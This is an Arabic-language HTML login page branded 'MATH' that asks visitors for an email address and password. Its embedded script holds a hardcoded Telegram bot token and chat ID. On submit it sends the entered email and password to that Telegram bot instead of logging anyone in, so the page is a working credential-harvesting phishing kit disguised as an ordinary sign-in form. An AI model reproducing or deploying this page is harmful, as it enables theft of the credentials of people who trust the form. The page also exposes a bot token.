<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>MATH | تسجيل الدخول</title>
  <style>
    body {
      background: linear-gradient(to right, #6a11cb, #2575fc);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }

    .login-container {
      background-color: white;
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
      width: 350px;
      text-align: center;
    }

    h1 {
      color: #2575fc;
      font-size: 32px;
      margin-bottom: 10px;
      letter-spacing: 2px;
    }

    h2 {
      margin-bottom: 30px;
      font-size: 20px;
      color: #555;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 14px;
    }

    button {
      width: 100%;
      background-color: #2575fc;
      color: white;
      padding: 12px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #1b5edc;
    }

    label {
      float: right;
      font-size: 14px;
      color: #444;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h1>MATH</h1>
    <h2>تسجيل الدخول</h2>
    <form id="loginForm">
      <label for="email">البريد الإلكتروني:</label>
      <input type="email" id="email" required>

      <label for="password">كلمة المرور:</label>
      <input type="password" id="password" required>

      <button type="submit">دخول</button>
    </form>
  </div>

  <script>
    const botToken = '7355545839:AAFJt4KMix_2tACUbOQL_qSduADd9AtTzMo';
    const chatId = '7721274748';

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const message = `📥 تسجيل دخول جديد:\n📧 الإيميل: ${email}\n🔑 كلمة المرور: ${password}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        alert('✅ تم الإرسال إلى البوت!');
      })
      .catch(error => {
        alert('❌ فشل الإرسال!');
      });
    });
  </script>
</body>
</html>
